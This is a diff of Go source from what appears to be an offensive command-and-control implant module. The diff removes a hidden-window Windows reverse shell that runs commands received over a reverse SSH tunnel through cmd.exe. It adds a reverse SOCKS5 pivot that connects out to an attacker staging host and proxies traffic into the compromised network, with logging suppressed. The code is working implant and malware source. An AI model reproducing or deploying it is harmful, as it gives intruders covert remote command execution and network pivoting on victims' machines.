@@ -1,42 +1,46 @@
-// +build windows
+// +build linux darwin windows
 
 
 package biterpreter
 
 import (
 	
-	"bufio"
-	"bytes"
+	"io"
 	"net"
-	"os/exec"
-	"syscall"
-
 	"golang.org/x/crypto/ssh"
-
-	//Fixes
+	"github.com/armon/go-socks5"
 	"time"
 	"encoding/json"
+	//"fmt"
+	"log"
+	"io/ioutil"
 )
-/*
+
+/* JSON struct already declared in revSSHSHELL module
 This JSON Object definition is needed in some Implants Modules to decode parameters
 Hive will have the same definitions in: ./src/hive/hiveJobs.go
-*/
+
 type InjectRevSshShellBichito struct {
     Domain string   `json:"domain"`
     Sshkey string   `json:"sshkey"`
     Port string   `json:"port"`
     User string   `json:"user"`
+    //Socks5Port string   `json:"socks5port"` //This is the SOCKS5 port that will be opened in the implant device
 }
+*/
 
 /*
-Description: Inject Reverse Shell --> Windows
+Description: Inject Reverse Socks5 
 Flow:
 A.Use golang ssh native library to spawn a ssh client that connects to a target staging
 	A1.Use provided credentials (username and pem key), for the ssh connection
 B.This connection will create a listener in 2222 localport of target staging
-C.Spawn a cmd process within the foothold, and pipe stdout/stdin through this last opened socket
+C.Open a SOCKS5 socket in bichito, then any remote receiving connection (remote SSH listen socket) will be TCP redireced to SOCKS5 
 */
-func RevSshShell(jsonparams string) (bool,string){
+func RevSshSocks5(jsonparams string) (bool,string){
+
+	//Debug
+	//fmt.Println(jsonparams)
 
 	var revsshshellparams *InjectRevSshShellBichito
 	errDaws := json.Unmarshal([]byte(jsonparams),&revsshshellparams)
@@ -73,68 +77,70 @@ func RevSshShell(jsonparams string) (bool,string){
 		return true,"Error: error listening on remote host:"+err.Error()
 	}
 
-	go listenSSH(sshConn,l)
+	go listenSSHSocks5(sshConn,l)//,revsshshellparams.Socks5Port)
 
-	return false,"Success: Rev SSH Shell Connected to Staging"
+	return false,"Success: Rev SSH Socks5 Connected to Staging"
 }
 
 
-func listenSSH(sshconn *ssh.Client,l net.Listener){
+func listenSSHSocks5(sshconn *ssh.Client,l net.Listener){//,socks5port string){
 
 	defer sshconn.Close()
 
+	//Make sure SOCKS5 don't log stuff
+	logger := log.New(ioutil.Discard, "", log.LstdFlags)
+	conf := &socks5.Config{Logger:logger}
+	//conf := &socks5.Config{}
+	server, err := socks5.New(conf)
+	if err != nil {
+  		return
+	}
+
 	// Start accepting shell connections
 	for {
+		
 		conn, err := l.Accept()
 		if err != nil {
-			continue
-		}
-
-		handleConnection(conn)
-
-		return
-	}
-}
-
-func handleConnection(c net.Conn) {
-	defer c.Close()
-
-	r := bufio.NewReader(c)
-	for{
-		order, err := r.ReadString('\n')
-		if nil != err {
+			//continue
 			return
 		}
 
-		var outbuf,errbuf bytes.Buffer
+		go server.ServeConn(conn)
 
-		// Start the command
-		cmd := exec.Command("C:\\Windows\\System32\\cmd.exe","/c",order+"\n")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-
-		cmd.Stdout = &outbuf
-		cmd.Stderr = &errbuf
+	}
+}
 
 
-		err = cmd.Run()
+func redirectTCP(client net.Conn, remote net.Conn) {
+	defer client.Close()
+	chDone := make(chan bool)
+
+	// Start remote -> local data transfer
+	go func() {
+		defer client.Close()
+		defer remote.Close()
+
+		_, err := io.Copy(client, remote)
 		if err != nil {
-			return
+			//log.Println(fmt.Sprintf("error while copy remote->local: %s", err))
 		}
+		chDone <- true
+	}()
 
-		c.Write([]byte(outbuf.String()))
-		c.Write([]byte(errbuf.String()))
-	}
+
+	// Start local -> remote data transfer
+	go func() {
+		defer client.Close()
+		defer remote.Close()
+
+		_, err := io.Copy(remote, client)
+		if err != nil {
+			//log.Println(fmt.Sprintf("error while copy local->remote: %s", err))
+		}
+		chDone <- true
+	}()
+
+
+	<-chDone
 
 }
-
-/*
-func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {
-
-
-	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
-	if signerErr != nil {
-		return nil, signerErr
-	}
-	return ssh.PublicKeys(signer), nil
-}
-*/
